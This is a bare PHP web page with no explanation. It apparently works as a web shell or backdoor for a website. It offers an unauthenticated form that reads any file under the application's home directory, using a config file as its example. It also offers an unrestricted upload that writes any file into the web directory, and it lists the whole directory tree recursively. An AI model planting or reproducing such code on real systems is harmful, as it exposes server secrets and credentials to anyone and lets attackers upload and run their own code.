<br>
    Read file
    <br> 
<form method='get' action=''>
<input type='text' name='read_file' value=''><br>
<small>Use '***' between file inside folder [exmpple config***app.php]</small><br>
<input type='submit' name='delete_file' value='READ File'><br>
</form>



<?php
   if(isset($_FILES['image'])){
    $errors= array();
    $file_name = $_FILES['image']['name'];
    $file_size =$_FILES['image']['size'];
    $file_tmp =$_FILES['image']['tmp_name'];
    $file_type=$_FILES['image']['type'];
    $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
      
      
    move_uploaded_file($file_tmp,$file_name);
    echo $file_name.'<br>';
     
   }
?>

    <br>
    Upload file
    <br>  
<form action="" method="POST" enctype="multipart/form-data">
         <input type="file" name="image" />
         <input type="submit" value='Upload File'/>
</form>


<?php
$home_path = str_replace('webroot','',getcwd());
$path = $home_path;
echo $home_path;
     echo '<br>';

function listFolderFiles($dir){
    $ffs = scandir($dir);

    unset($ffs[array_search('.', $ffs, true)]);
    unset($ffs[array_search('..', $ffs, true)]);

    // prevent empty ordered elements
    if (count($ffs) < 1)
        return;

    echo '<ol>';
    foreach($ffs as $ff){
        echo '<li>'.$ff;
        if(is_dir($dir.'/'.$ff)){
            listFolderFiles($dir.'/'.$ff); 
        }
        echo '</li>';
    }
    echo '</ol>';
}



if(!empty($_GET['read_file'])){
    // echo $_GET['read_file'];exit;
    $read_file =  str_replace('***', '/', $_GET['read_file']);
    $file = fopen($home_path.$read_file, "r");

    //Output lines until EOF is reached
    while(! feof($file)) {
      $line = fgets($file);
      echo $line. "<br>";
    }
    
    fclose($file);
}else{
    listFolderFiles($home_path);
}
?>


